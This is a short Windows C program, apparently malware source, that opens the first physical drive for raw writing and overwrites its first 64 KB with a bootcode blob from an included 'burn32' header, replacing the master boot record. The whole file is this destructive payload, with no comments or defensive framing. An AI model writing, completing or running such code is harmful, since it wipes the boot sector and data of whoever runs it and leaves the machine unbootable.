#include <Windows.h>
#include "../out/burn32.h"

int main() {
	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (drive == INVALID_HANDLE_VALUE)
		ExitProcess(1);

	unsigned char* bootcode = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 65536);

	for (int i = 0; i < out_burn32_bin_len; i++)
		*(bootcode + i) = *(out_burn32_bin + i);

	DWORD wb;
	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
		ExitProcess(3);

	CloseHandle(drive);
}